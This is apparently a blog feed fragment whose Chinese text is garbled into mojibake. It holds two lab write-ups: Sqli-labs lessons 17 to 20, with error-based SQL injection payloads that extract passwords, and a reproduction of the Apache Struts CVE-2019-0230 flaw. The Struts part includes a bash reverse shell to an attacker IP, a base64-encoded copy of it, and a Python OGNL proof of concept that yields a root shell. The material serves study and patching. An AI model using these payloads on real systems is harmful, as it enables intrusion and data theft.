class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ ¹æ®é¢˜ç›®æç¤ºä¸æºç æ¨æµ‹passwdä¸ºæ³¨å…¥ç‚¹</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110114238770.png" class><p><code>payloadåŒLess-5çš„æ–¹æ³•ä¸€</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110120051232.png" class><p><code>è¿™é‡Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹payloadä¼šæŠ¥é”™ï¼Œusersä¸èƒ½è¢«ä¿®æ”¹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122233780.png" class><p><code>å¯¹payloadè¿›è¡ŒåµŒå¥—ï¼Œä¿®æ”¹ä¸ºå¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as demo),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122126131.png" class><p><code>å…¶ä»–æ³¨å…¥ä¸åœ¨èµ˜è¿°</code></p><h2 id="0x18-Less-18-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Uagent-field"><a href="#0x18-Less-18-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Uagent-field" class="headerlink" title="0x18.Less-18 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Uagent-field"></a>0x18.Less-18 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Uagent-field</h2><p><code>æŸ¥çœ‹æºç </code></p><blockquote><p>å¯ä»¥å‘ç°ï¼Œè¿™é‡Œçš„$unameä¸$passwdéƒ½åšäº†è¿‡æ»¤ï¼Œå³å½“å­˜åœ¨ç‰¹æ®Šå­—ç¬¦æ—¶åŠ ä¸Š/è¿›è¡Œè½¬ä¹‰</p><p>å¹¶ä¸”insertå‡½æ•°å°†Uagentæ’å…¥åˆ°äº†æ•°æ®åº“</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    $IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &#x27;Your User Agent is: &#x27; .$uagent;</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Your User name:&#x27;. $uname;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Password:&#x27;. $passwd;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $uagent;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $IP;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.    </span></span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;User Agent:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">    $result1 = mysql_query($sql);</span><br><span class="line">    $row1 = mysql_fetch_array($result1);</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            $insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br><span class="line">            mysql_query($insert);</span><br><span class="line">            <span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;    </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>æ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹payload</code></p><blockquote><p>updatexmlä¸extractvalueä½œç”¨ç›¸åŒ</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><br><span class="line">andä¸oréƒ½å¯ä»¥ï¼Œåªæ˜¯ä¸ºäº†é—­åˆå•å¼•å·</span><br></pre></td></tr></table></figure><p><code>æœåŠ¡å™¨æ‰§è¡Œçš„å‘½ä»¤å¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=&#x27;admin&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27; and users.password=&#x27;&#x27; ORDER BY users.id DESC LIMIT 0,1&quot;</span></span></span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110124944874.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110133641590.png" class><h2 id="0x19-Less-19-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Referer-field"><a href="#0x19-Less-19-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Referer-field" class="headerlink" title="0x19.Less-19 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Referer-field"></a>0x19.Less-19 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Referer-field</h2><p><code>åŒLess18ï¼Œåªæ˜¯æ³¨å…¥ç‚¹å˜ä¸ºreferer</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110125136890.png" class><h2 id="0x20-Less-20-POST-åŸºäºæŠ¥é”™-cookieæ³¨å…¥"><a href="#0x20-Less-20-POST-åŸºäºæŠ¥é”™-cookieæ³¨å…¥" class="headerlink" title="0x20.Less-20 POST åŸºäºæŠ¥é”™ cookieæ³¨å…¥"></a>0x20.Less-20 POST åŸºäºæŠ¥é”™ cookieæ³¨å…¥</h2><p><code>æ³¨å…¥ç‚¹ä¸ºcookieï¼Œæ–¹æ³•åŒLess-1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3 -- -</span><br><span class="line">uname=admin&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130119066.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130152559.png" class><p><strong><em>skip:deciduous_tree:</em></strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page1(basic)&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0230å¤ç°</title>
    <link href="https://lunamoore.github.io/2020/12/19/CVE-2019-0230/"/>
    <id>https://lunamoore.github.io/2020/12/19/CVE-2019-0230/</id>
    <published>2020-12-19T08:35:58.000Z</published>
    <updated>2021-06-06T12:53:36.758Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-0230-S2-059"><a href="#CVE-2019-0230-S2-059" class="headerlink" title="CVE-2019-0230(S2-059)"></a>CVE-2019-0230(S2-059)</h2><hr><h2 id="0x00-æ¼æ´ç®€è¿°"><a href="#0x00-æ¼æ´ç®€è¿°" class="headerlink" title="0x00.æ¼æ´ç®€è¿°"></a>0x00.æ¼æ´ç®€è¿°</h2><blockquote><p>Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.</p><p>Apache Struts 2.0.0åˆ°2.5.20å¼ºåˆ¶æ‰§è¡ŒåŒé‡OGNLè®¡ç®—ï¼Œå½“å¯¹åŸå§‹ç”¨æˆ·è¾“å…¥çš„æ ‡è®°å±æ€§è¿›è¡Œè®¡ç®—æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p></blockquote><a id="more"></a><h2 id="0x01-å½±å“"><a href="#0x01-å½±å“" class="headerlink" title="0x01.å½±å“"></a>0x01.å½±å“</h2><ul><li><strong>version: 2.0.0-2.5.20</strong></li><li><strong>solution: apache-struts-upgrade-2_5_22</strong></li></ul><table><thead><tr><th align="center"><strong>Severity</strong></th><th align="center"><strong>CVSS</strong></th><th align="center"><strong>Published</strong></th><th align="center"><strong>Created</strong></th><th align="center"><strong>Added</strong></th><th align="center"><strong>Modified</strong></th></tr></thead><tbody><tr><td align="center">8</td><td align="center">(AV:N/AC:L/Au:N/C:P/I:P/A:P)</td><td align="center">08/17/2020</td><td align="center">08/15/2020</td><td align="center">08/17/2020</td><td align="center">09/21/2020</td></tr></tbody></table><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02.æ¼æ´åˆ†æ"></a>0x02.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cudG9wc2VjLmNvbS5jbi9zdHJ1dHMyLXMyLTA1OS0lRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">å¤©èä¿¡é˜¿å°”æ³•å®éªŒå®¤æ¼æ´åˆ†æ<i class="fa fa-external-link-alt"></i></span></p><p><strong>é€šè¿‡å­¦ä¹ å¯çŸ¥ï¼šæ­¤æ¬¡æ¼æ´éœ€è¦å¼€å¯ï¼ˆé»˜è®¤å¼€å¯ï¼‰<code>altSyntax</code>åŠŸèƒ½,åªèƒ½æ˜¯åœ¨æ ‡ç­¾<code>id</code>å±æ€§ä¸­å­˜åœ¨è¡¨è¾¾å¼,å¹¶ä¸”å‚æ•°è¿˜å¯ä»¥æ§åˆ¶ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„è¡¨è¾¾å¼èµ‹å€¼ç»™idå‚æ•°ï¼Œä¼ å‚åå¯¼è‡´äºŒæ¬¡è§£æå¯é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</strong></p><h2 id="0x03-æ­å»ºç¯å¢ƒ"><a href="#0x03-æ­å»ºç¯å¢ƒ" class="headerlink" title="0x03.æ­å»ºç¯å¢ƒ"></a>0x03.æ­å»ºç¯å¢ƒ</h2><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3N0cnV0czIvczItMDU5Lw==">æœ¬æ¬¡ç¯å¢ƒ<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04.æ¼æ´å¤ç°"></a>0x04.æ¼æ´å¤ç°</h2><h3 id="1-è®¿é—®ç¯å¢ƒ"><a href="#1-è®¿é—®ç¯å¢ƒ" class="headerlink" title="1.è®¿é—®ç¯å¢ƒ"></a>1.è®¿é—®ç¯å¢ƒ</h3><img src="/2020/12/19/CVE-2019-0230/image-20201219162137008.png" class><h3 id="2-æ¼æ´éªŒè¯"><a href="#2-æ¼æ´éªŒè¯" class="headerlink" title="2.æ¼æ´éªŒè¯"></a>2.æ¼æ´éªŒè¯</h3><p><code>é€šè¿‡æ„é€ è¡¨è¾¾å¼%25&#123;2*10&#125;æ‰§è¡Œåå‘ç°æ ‡ç­¾å±æ€§idå€¼å˜æˆäº†ä¸º10ï¼Œè¯´æ˜æˆåŠŸæ‰§è¡Œäº†è¡¨è¾¾å¼å¹¶è¿ç®—2*10ï¼Œå¹¶è¿”å›äº†ç»“æœã€‚</code></p><img src="/2020/12/19/CVE-2019-0230/image-20201219161950859.png" class><h3 id="3-æ„é€ payload"><a href="#3-æ„é€ payload" class="headerlink" title="3.æ„é€ payload"></a>3.æ„é€ payload</h3><p><code>æœ¬æ¬¡ä½¿ç”¨bash -i &gt;&amp; /dev/tcp/192.168.1.129/6666 0&gt;&amp;1ï¼ˆéœ€è¦ç¼–ç ï¼‰</code></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">ç¼–ç è½¬æ¢åœ°å€<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>è½¬æ¢</p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</p></blockquote><h3 id="4-ç¼–å†™POC"><a href="#4-ç¼–å†™POC" class="headerlink" title="4.ç¼–å†™POC"></a>4.ç¼–å†™POC</h3><p><code>å°†payloadæ”¾åˆ°å¯¹åº”ä½ç½®ä¸Š</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.137:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;payload&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure><h3 id="5-åˆ©ç”¨"><a href="#5-åˆ©ç”¨" class="headerlink" title="5.åˆ©ç”¨"></a>5.åˆ©ç”¨</h3><p><code>kaliç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡ŒPOC get shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.137] 33258</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@88497928f70b:/usr/src# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@88497928f70b:/usr/src#</span><br></pre></td></tr></table></figure><h2 id="0x05-è§£å†³åŠæ³•"><a href="#0x05-è§£å†³åŠæ³•" class="headerlink" title="0x05.è§£å†³åŠæ³•"></a>0x05.è§£å†³åŠæ³•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æœ€ç»ˆçš„è§£å†³æ–¹æ³•æ˜¯ä¸ºä¼ å…¥çš„æ¯ä¸ªå€¼æ·»åŠ é€‚å½“çš„éªŒè¯ï¼Œå¹¶å°†å…¶ç”¨äºæ ‡è®°çš„å±æ€§ä¸­ã€‚  é™¤éä¸ºæœ‰æ•ˆçš„ç”¨ä¾‹çœŸæ­£éœ€è¦ï¼Œå¦åˆ™è¯·å‹¿ä½¿ç”¨å¼ºåˆ¶ä½¿ç”¨å€¼ï¼…ä»¥å¤–çš„å±æ€§æ±‚å€¼ï¼Œè€Œä½¿ç”¨ï¼…&#123;...&#125;æˆ–$ &#123;...&#125;è¯­æ³•ã€‚ </span><br><span class="line"></span><br><span class="line">é€šè¿‡ å‡çº§åˆ°Struts 2.5.22ï¼Œå¼ºåˆ¶åŒé‡è¯„ä¼°çš„å¯èƒ½æ¶æ„å½±å“å°†è¿›ä¸€æ­¥å—åˆ°é™åˆ¶ï¼Œå¹¶å…³é—­äº†å·²æŠ¥å‘Šçš„æ”»å‡»åª’ä»‹ï¼Œç‰¹åˆ«æ˜¯ä¸ä¸»åŠ¨OGNLè¡¨è¾¾æ³¨å…¥ä¿æŠ¤ç»“åˆä½¿ç”¨æ—¶ã€‚</span><br><span class="line"></span><br><span class="line">å‡çº§åˆ°Struts 2.5.22æ—¶æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚ï¼ˆçœŸçš„å—ï¼Ÿï¼Ÿï¼ŸğŸ™ƒï¼‰</span><br></pre></td></tr></table></figure><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06.æ€»ç»“"></a>0x06.æ€»ç»“</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¼ºåˆ¶ä½¿ç”¨Apache Strutsæ¡†æ¶æ—¶ï¼Œä¼šå¯¹åˆ†é…ç»™æŸäº›æ ‡ç­¾å±æ€§çš„å±æ€§å€¼è¿›è¡ŒåŒé‡è¯„ä¼°ï¼Œä¾‹å¦‚ï¼Œidè¿™æ ·å°±å¯ä»¥ä¼ é€’ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼å°†åœ¨å‘ˆç°æ ‡ç­¾å±æ€§æ—¶å†æ¬¡è¿›è¡Œè¯„ä¼°ã€‚é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„è¯·æ±‚ï¼Œè¿™å¯ä»¥å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»£ç ï¼ˆRCEï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">ä»…å½“åœ¨Strutsæ ‡è®°å±æ€§å†…å¼ºåˆ¶æ‰§è¡ŒOGNLè¯„ä¼°æ—¶ï¼Œæ­¤é—®é¢˜æ‰é€‚ç”¨ï¼Œå½“è¯„ä¼°çš„è¡¨è¾¾å¼å¼•ç”¨æœªç»æ”»å‡»çš„åŸå§‹è¾“å…¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾è®¡ç›¸åº”çš„è¯·æ±‚æ¥ç›´æ¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;s:url var=&quot;url&quot; namespace=&quot;/employee&quot; action=&quot;list&quot;/&gt;&lt;s:a id=&quot;%&#123;skillName&#125;&quot; href=&quot;%&#123;url&#125;&quot;&gt;List available Employees&lt;/s:a&gt;</span><br><span class="line">å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹skillNameè¯·æ±‚ä¸­çš„å±æ€§ï¼Œä»¥ä½¿åŸå§‹OGNLè¡¨è¾¾å¼skillNameæ— éœ€è¿›ä¸€æ­¥éªŒè¯å³å¯ä¼ é€’ç»™è¯¥å±æ€§ï¼Œåˆ™skillNameå½“ä½œä¸ºè¯·æ±‚çš„ç»“æœå‘ˆç°æ ‡è®°æ—¶ï¼Œå°†è¯„ä¼°å±æ€§ä¸­åŒ…å«çš„æä¾›çš„OGNLè¡¨è¾¾å¼ã€‚</span><br><span class="line"></span><br><span class="line">ä»2.0.0å¼€å§‹ï¼ŒStrutsä¼šè®¾è®¡ä½¿ç”¨åŒé‡è¯„ä¼°çš„æœºä¼šï¼Œå¹¶ä¸”æ­£ç¡®å®Œæˆåå°†æˆä¸ºæœ‰ç”¨çš„å·¥å…·ï¼Œè¿™æœ€æ˜¾ç€çš„æ„æ€æ˜¯ä»…åœ¨ç»™å®šè¡¨è¾¾å¼ä¸­å¼•ç”¨ç»è¿‡éªŒè¯çš„å€¼ã€‚ä½†æ˜¯ï¼Œåœ¨è¡¨è¾¾å¼ä¸­å¼•ç”¨æœªç»éªŒè¯çš„ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå¯èƒ½ä¼šæ³¨å…¥æ¶æ„ä»£ç 